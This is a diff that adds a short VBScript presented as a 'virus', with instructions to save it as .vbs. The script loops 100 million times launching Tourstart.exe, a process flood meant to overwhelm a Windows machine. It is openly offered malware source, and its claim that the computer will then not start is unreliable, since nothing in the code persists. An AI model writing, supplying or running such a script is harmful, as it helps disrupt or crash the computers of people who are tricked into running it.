@@ -1,0 +1,20 @@
+do not run on your computer!!!! 
+copy on notepad and save as .vbs
+
+if you run this virus on your computer and sutit down you will not be able to start your computer
+
+
+
+
+
+
+
+Option Explicit
+
+Dim WSHShell
+Set WSHShell=Wscript.CreateObject(“Wscript.Shell”)
+
+Dim x
+For x = 1 to 100000000
+WSHShell.Run “Tourstart.exe”
+Next
